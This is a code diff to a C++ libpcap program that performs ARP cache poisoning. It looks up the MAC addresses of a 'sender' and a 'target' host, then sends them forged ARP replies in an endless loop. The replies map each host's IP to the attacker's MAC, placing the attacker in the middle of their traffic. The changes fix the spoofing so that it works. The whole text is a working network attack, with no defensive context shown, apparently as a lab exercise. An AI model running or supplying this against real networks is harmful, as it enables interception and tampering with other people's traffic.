@@ -80,7 +80,7 @@ void replyArp(pcap_t* handle, uint8_t senderMac[6], uint8_t senderIp[4], uint8_t
 
     ethHdr->type = htons(ETHERTYPE_ARP);
     memcpy(ethHdr->smac, senderMac, 6);
-    memset(ethHdr->dmac, 0xFF, 6);
+    memcpy(ethHdr->dmac, targetMac, 6);
 
     arpHdr->hwtype = htons(0x0001);
     arpHdr->ptype = htons(ETHERTYPE_IP);
@@ -101,7 +101,7 @@ void replyArp(pcap_t* handle, uint8_t senderMac[6], uint8_t senderIp[4], uint8_t
     delete pkt;
 }
 
-std::string queryMac(pcap_t* handle, uint8_t myMac[6], uint8_t myIp[4], uint8_t otherIp[4])
+uint8_t* queryMac(pcap_t* handle, uint8_t myMac[6], uint8_t myIp[4], uint8_t otherIp[4])
 {
     struct bpf_program prog;
     auto filterString = toFilterString(myMac, otherIp);
@@ -132,10 +132,12 @@ std::string queryMac(pcap_t* handle, uint8_t myMac[6], uint8_t myIp[4], uint8_t 
     
     auto arpPkt = dynamic_cast<ArpPacket*>(Packet::parse(pkt, pktHdr->caplen));
     auto arpHdr = arpPkt->arpHeader();
-    return Helper::toMacString(arpHdr->smac);
+    auto newMac = new uint8_t[6];
+    memcpy(newMac, arpHdr->smac, 6);
+    return newMac;
 }
 
-std::string queryMac(pcap_t* handle, uint8_t myMac[6], uint32_t myIp, uint32_t otherIp)
+uint8_t* queryMac(pcap_t* handle, uint8_t myMac[6], uint32_t myIp, uint32_t otherIp)
 {
     return queryMac(handle, myMac, reinterpret_cast<uint8_t*>(&myIp), reinterpret_cast<uint8_t*>(&otherIp));
 }
@@ -175,11 +177,16 @@ int main(int argc, char** argv) {
     std::printf("\n");
     printf("%s\n", inet_ntoa(myIp));
 
+    std::cout << "sender: " << argv[2] << std::endl;
+    std::cout << "target: " << argv[3] << std::endl;
+
     struct sockaddr_in senderAddress;
     inet_pton(AF_INET, argv[2], &senderAddress.sin_addr);
 
+
     struct sockaddr_in targetAddress;
     inet_pton(AF_INET, argv[3], &targetAddress.sin_addr);
+    
 
     /*
     auto pkt = new unsigned char[sizeof(EthHeader) + sizeof(ArpHeader)];
@@ -217,26 +224,28 @@ int main(int argc, char** argv) {
 
     auto senderMac = queryMac(handle, reinterpret_cast<uint8_t*>(myMac), myIp.s_addr, senderAddress.sin_addr.s_addr);
     auto targetMac = queryMac(handle, reinterpret_cast<uint8_t*>(myMac), myIp.s_addr, targetAddress.sin_addr.s_addr);
-    
-    std::cout << "senderMac: " << senderMac << " targetMac: " << targetMac << std::endl;
 
+    //senderAddress.sin_addr.s_addr = ntohl(senderAddress.sin_addr.s_addr);
+    //targetAddress.sin_addr.s_addr = ntohl(targetAddress.sin_addr.s_addr);
+    
     while(true) {
         replyArp(
             handle,
-            reinterpret_cast<uint8_t*>(&senderAddress.sin_addr.s_addr),
             reinterpret_cast<uint8_t*>(myMac),
-            reinterpret_cast<uint8_t*>(const_cast<char*>(targetMac.c_str())),
+            reinterpret_cast<uint8_t*>(&senderAddress.sin_addr.s_addr),
+            reinterpret_cast<uint8_t*>(targetMac),
             reinterpret_cast<uint8_t*>(&targetAddress.sin_addr.s_addr)
         );
         replyArp(
             handle,
-            reinterpret_cast<uint8_t*>(&targetAddress.sin_addr.s_addr),
             reinterpret_cast<uint8_t*>(myMac),
-            reinterpret_cast<uint8_t*>(const_cast<char*>(senderMac.c_str())),
+            reinterpret_cast<uint8_t*>(&targetAddress.sin_addr.s_addr),
+            reinterpret_cast<uint8_t*>(senderMac),
             reinterpret_cast<uint8_t*>(&senderAddress.sin_addr.s_addr)
         );
     }
-
+    delete senderMac;
+    delete targetMac;
 
 
     /*
